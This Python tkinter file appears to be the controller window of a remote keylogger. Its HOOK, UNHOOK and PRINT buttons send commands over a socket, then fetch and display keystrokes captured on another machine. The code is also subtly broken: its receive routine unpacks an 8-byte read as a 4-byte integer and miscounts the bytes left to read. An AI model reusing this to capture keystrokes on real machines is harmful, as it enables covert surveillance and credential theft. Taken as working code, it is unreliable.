import tkinter as tk
import socket
import struct

class KeylogWindow:
    def __init__(self, client, client_socket):
        self.client = client
        self.client.client_socket = client_socket
        
        self.root = tk.Tk()
        self.root.geometry('350x260')
        self.root.title("Keylog Window")

        self.button_frame = tk.Frame(self.root)
        self.button_frame.pack(pady = (10, 5))

        self.button1 = tk.Button(self.button_frame, text = "HOOK", command = self.send_hook, bg = "#323232", fg = "#FAFAFA", width = 10, height = 1)
        self.button1.pack(side = tk.LEFT, padx = (10, 5))

        self.button2 = tk.Button(self.button_frame, text = "UNHOOK", command = self.send_unhook, bg = "#323232", fg = "#FAFAFA", width = 10, height = 1)
        self.button2.pack(side = tk.LEFT, padx = (5, 5))

        self.button3 = tk.Button(self.button_frame, text = "PRINT", command = self.send_print, bg = "#323232", fg = "#FAFAFA", width = 10, height = 1)
        self.button3.pack(side = tk.LEFT, padx = (5, 10))

        self.txtKQ = tk.Text(self.root, width = 300)
        self.txtKQ.pack(padx = 10, pady = (5, 10))

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.root.mainloop()

    def send_hook(self):
        self.client.client_socket.sendall("HOOK".encode())

    def send_unhook(self):
        self.client.client_socket.sendall("UNHOOK".encode())

    def recvall(self):
        byteRecv = self.client.client_socket.recv(8)
        remaining_data = struct.unpack('!I',byteRecv)[0]
        received_data = b""
        while remaining_data > 0:
            chunk =  self.client.client_socket.recv(min(1024, remaining_data))
            if not chunk:
                break
            received_data += chunk
            remaining_data -= 1024
        received_string = received_data.decode()
        return received_string

    def send_print(self):
        s = "PRINT"
        self.client.client_socket.sendall(s.encode())
        received_data = self.recvall()
        self.txtKQ.insert(tk.END, received_data)

    def on_closing(self):
        self.client.client_socket.sendall("QUIT".encode())
        self.root.destroy()